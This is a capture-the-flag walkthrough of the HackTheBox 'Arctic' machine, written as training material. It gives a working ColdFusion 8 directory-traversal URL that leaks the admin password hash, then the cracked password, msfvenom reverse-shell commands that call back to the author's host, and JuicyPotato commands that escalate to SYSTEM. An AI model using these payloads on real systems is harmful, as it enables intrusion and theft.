# HackTheBox | Arctic

## Initial TCP Nmap Scan

```
Nmap scan report for 10.10.10.11
Host is up (0.075s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 143.42 seconds
```

## Full TCP Nmap Scan

```
nmap -sC -sV -p- 10.10.10.11
```

```
Nmap scan report for 10.10.10.11
Host is up (0.076s latency).
Not shown: 65532 filtered ports
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 242.86 seconds
```

## Initial Thoughts Based On Nmap Scans

Looking at the scans we see we have three ports open: 135, 8500, and 49154. 135 and 49154 are both related to Microsoft Windows RPC so we may be able to try to enumerate this service by using tools such as `enum4linux`, `rpcclient`, etc. For port 8500, I have no idea what that port is so seeing if it is a web server or if I can try to tinker with it by using `Netcat` to connect to it might be a good option. With all that being said, let's start looking more into this box.

## Port 8500 | Enumeration

Doing some Googling I see that `port 8500` is known to host Adobe Cold Fusion, which is a web application development computing platform. Knowing this, I go ahead and navigate to `http://10.10.10.11:8500` and get an `Index` page.

![image-20210614134636436](C:\Users\brice\AppData\Roaming\Typora\typora-user-images\image-20210614134636436.png)

Clicking through the index is extremely slow for some reason. Either way, I was able to navigate to `CFIDE/administrator` and was given the following web page:

![image-20210614135038773](C:\Users\brice\AppData\Roaming\Typora\typora-user-images\image-20210614135038773.png)

So this is running Adobe Coldfusion 8. Looking at the source code by right clicking the web page and hitting "View Page Source" I saw some information about Adobe's copyright.

```
Copyright (c) 1995-2006 Adobe Software LLC. All rights reserved
```

This gives me a general idea of where to look when I am searching for exploits. I went ahead and Googled "Coldfusion 8 2006 exploit" and stumbled across an [ExploitDB](Copyright (c) 1995-2006 Adobe Software LLC. All rights reserved) page. It is a directory traversal attack. A directory traversal attack is where a user can read arbitrary files on a server by traversing back parent directories and being able to read a file, such as `www.website.com/file?=../../../../../../../etc/passwd` will read the `/etc/passwd` file. In this case, it seems that ColdFusion8 stores password properties as a file under `ColdFusion8/lib/password.properties%00en`. Let's see if this directory traversal attack works. Navigating to `http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en` shows the following webpage:

![image-20210614135612263](C:\Users\brice\AppData\Roaming\Typora\typora-user-images\image-20210614135612263.png)

We see the password, but it seems to be some sort of hash. I go ahead and use the tool `hash-identifier` to see what type of hash this is.

```
root@kali-[~]hash-identifier                                                                 
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03

Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))

Least Possible Hashs:
[+] Tiger-160
[+] Haval-160
[+] RipeMD-160
[+] SHA-1(HMAC)
[+] Tiger-160(HMAC)
[+] RipeMD-160(HMAC)
[+] Haval-160(HMAC)
[+] SHA-1(MaNGOS)
[+] SHA-1(MaNGOS2)
[+] sha1($pass.$salt)
[+] sha1($salt.$pass)
[+] sha1($salt.md5($pass))
[+] sha1($salt.md5($pass).$salt)
[+] sha1($salt.sha1($pass))
[+] sha1($salt.sha1($salt.sha1($pass)))
[+] sha1($username.$pass)
[+] sha1($username.$pass.$salt)
[+] sha1(md5($pass))
[+] sha1(md5($pass).$salt)
[+] sha1(md5(sha1($pass)))
[+] sha1(sha1($pass))
[+] sha1(sha1($pass).$salt)
[+] sha1(sha1($pass).substr($pass,0,3))
[+] sha1(sha1($salt.$pass))
[+] sha1(sha1(sha1($pass)))
[+] sha1(strtolower($username).$pass)
--------------------------------------------------
```

It shows that the possible hash is `SHA-1` or `MySQL5`. Knowing that it is most likely `SHA-1`, I use the website [CrackStation](https://crackstation.net/) to crack this SHA-1 hash value.

![image-20210614135900216](C:\Users\brice\AppData\Roaming\Typora\typora-user-images\image-20210614135900216.png)

And we get the password as `happyday`. I went ahead and went back to `10.10.10.11:8500/CFIDE/administrator/` to try to login with `admin:happyday` and I successfully logged in. After awhile of waiting for the page to load, we finally see the following:

![image-20210614143026142](C:\Users\brice\AppData\Roaming\Typora\typora-user-images\image-20210614143026142.png)

Out of the list of options we can do on ColdFusion8, the **Scheduled Tasks** seemed the most interesting to me. The reason for this is we may be able to have it do a task for us and then return a reverse shell. Navigating to **Debugging & Logging > Scheduled Tasks** presents the following:

![image-20210614143350074](C:\Users\brice\AppData\Roaming\Typora\typora-user-images\image-20210614143350074.png)

Clicking on **Schedule New Task** shows us this:

![image-20210614143438940](C:\Users\brice\AppData\Roaming\Typora\typora-user-images\image-20210614143438940.png)

Seems we have a lot we can work with. The thing that seems the most interesting is that we can put a file into the task. Something to note is that the "File" field needs to be given where we want to put the file we are uploading. I navigated around the web service a bit and found that under **Server Settings > Settings Summary** the path for CFIDE which we saw earlier is located under the path `C:\ColdFusion8\wwwroot\CFIDE`. Now we know where we can put our file.

![image-20210614145103932](C:\Users\brice\AppData\Roaming\Typora\typora-user-images\image-20210614145103932.png)

Since the technology that is being ran for ColdFusion is Java, `.jsp` files will be the one we want to use to get a reverse shell. Knowing this, I am going to create a payload using `msfvenom` which is a payload generator and encoder. 

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.36 LPORT=1337 -f raw> reverse.jsp
```

This will create a `.jsp` reverse shell with `LHOST` being your IP, and `LPORT` being the port you will be listening on.

Now we can go ahead and upload this through the scheduled task. I setup a simple HTTP server using the `python -m SimpleHTTPServer 80` command on the directory that has my `reverse.jsp` file.

![image-20210614222004098](C:\Users\brice\AppData\Roaming\Typora\typora-user-images\image-20210614222004098.png)

Now that we have our schedule tasks, we can click the green icon on the left to execute the task.

![image-20210614194813933](C:\Users\brice\AppData\Roaming\Typora\typora-user-images\image-20210614194813933.png)

Now let's start up our Netcat listener on port 1337 and then navigate to `10.10.10.11:8500/CFIDE/reverse.jsp`. 

```
nc -lvnp 1337
```

We get a low privileged shell.

```
root@kali-[~]nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.36] from (UNKNOWN) [10.10.10.11] 51283
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis
```

## Privilege Escalation

First thing I do when I get a low privileged shell is run `whoami /all` and see if I have any interesting privileges.

```
C:\ColdFusion8\runtime\bin>whoami /all                                                                                
whoami /all                                                                                                           
                                                           
USER INFORMATION                              
----------------                                  
                                                           
User Name    SID                                          
============ =============================================                                                            
arctic\tolis S-1-5-21-2913191377-1678605233-910955532-1000
                                                           
                                                           
GROUP INFORMATION                  
-----------------                
                                                           
Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288 Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

We see we have `SeImpersonatePrivilege` enabled.  `SeImpersonatePrivilege` allows a user account to impersonate another user for a brief period of time. We are going to abuse this to impersonate the `SYSTEM` user to get the highest privileges possible on this host. We can use the `Juicy Potato` exploit which we have used in a previous box [Devel](https://blauersec.com/hack%20the%20box/2021/05/27/htb-devel.html) to abuse the fact that `SeImpersonatePrivilege` is enabled. If you want some more detail on `Juicy Potato`, please take a look at my [Devel](https://blauersec.com/hack%20the%20box/2021/05/27/htb-devel.html) blog post at the privilege escalation section. To go ahead and start the process of utilizing Juicy Potato, let's setup a SMB server that has our `JuicyPotato.exe` within our directory. You can get `Juicy Potato` by using `git clone https://github.com/ohpe/juicy-potato.git`. 

```bash
root@kali-[/opt/potato]ls -lah
total 776K
drwxr-xr-x  2 root root 4.0K May 31 01:24 .
drwxr-xr-x 25 root root 4.0K Jun 14 12:19 ..
-rw-r--r--  1 root root 340K Aug 10  2018 JuicyPotato.exe
-rw-r--r--  1 root root 125K May 11  2020 RogueOxidResolver.exe
-rw-r--r--  1 root root 156K May 11  2020 RoguePotato.exe
-rw-r--r--  1 root root 144K May 11  2020 RoguePotato.zip
                                                                                                                                                                                                                                            
root@kali-[/opt/potato]smbserver.py share .
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Copy the file over to the Windows host using:

```
\\10.10.14.36\share\JuicyPotato.exe
```

```
C:\ColdFusion8\runtime\bin>copy \\10.10.14.36\share\JuicyPotato.exe
copy \\10.10.14.36\share\JuicyPotato.exe

        1 file(s) copied.

C:\ColdFusion8\runtime\bin>
C:\ColdFusion8\runtime\bin>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is F88F-4EA5

 Directory of C:\ColdFusion8\runtime\bin

16/06/2021  04:34     <DIR>          .
16/06/2021  04:34     <DIR>          ..
18/03/2008  12:11             64.512 java2wsdl.exe
19/01/2008  10:59          2.629.632 jikes.exe
18/03/2008  12:11             64.512 jrun.exe
18/03/2008  12:11             71.680 jrunsvc.exe
18/03/2008  12:11              5.120 jrunsvcmsg.dll
18/03/2008  12:11             64.512 jspc.exe
10/08/2018  12:55            347.648 JuicyPotato.exe
22/03/2017  09:53              1.804 jvm.config
18/03/2008  12:11             64.512 migrate.exe
18/03/2008  12:11             34.816 portscan.dll
18/03/2008  12:11             64.512 sniffer.exe
18/03/2008  12:11             78.848 WindowsLogin.dll
18/03/2008  12:11             64.512 wsconfig.exe
22/03/2017  09:53              1.013 wsconfig_jvm.config
18/03/2008  12:11             64.512 wsdl2java.exe
18/03/2008  12:11             64.512 xmlscript.exe
              16 File(s)      3.686.657 bytes
               2 Dir(s)  33.182.593.024 bytes free
```

We can see that `JuicyPotato.exe` is in the directory now. We also need a reverse shell payload within this directory so let's create reverse shell payload for Windows and setup another SMB server in the directory we made the payload.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.36 LPORT=1337 -f exe > shell.exe
```

```
smbserver.py share .
```

Now I go ahead and copy the `shell.exe` file over to the Windows host.

```
C:\ColdFusion8\runtime\bin>copy \\10.10.14.36\share\shell.exe 
copy \\10.10.14.36\share\shell.exe
        1 file(s) copied.
```

Now that `shell.exe` and `JuicyPotato.exe` are within this directory, I can go ahead and setup a `Netcat` listener on port 1337 and run the following command on the Windows host to gain a `SYSTEM` shell.

```
root@kali-[~]nc -lvnp 1337
```

```
JuicyPotato.exe -t * -l 1337 -p C:\ColdFusion8\runtime\bin\shell.exe -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
```

```
root@kali-[~]nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.36] from (UNKNOWN) [10.10.10.11] 51379
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

The `-c` asks for a CLSID or “class identifier”. CLSIDs are `.NET classes` and the CLSIDs we are going to use refer to services that are running as `SYSTEM`. We essentially are impersonating a service by supplying a `CLSID` of a service that is running with higher privileges than us, that being `SYSTEM`. The `{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}` is a CLSID of a service that is running as `SYSTEM` so we use that `CLSID` to gain a `SYSTEM` shell. At the end of the day, this box was pretty interesting. Getting initial foothold was the most interesting part, but having the amount of lag on ColdFusion was not all that fun to deal with. Either way, was a great box!
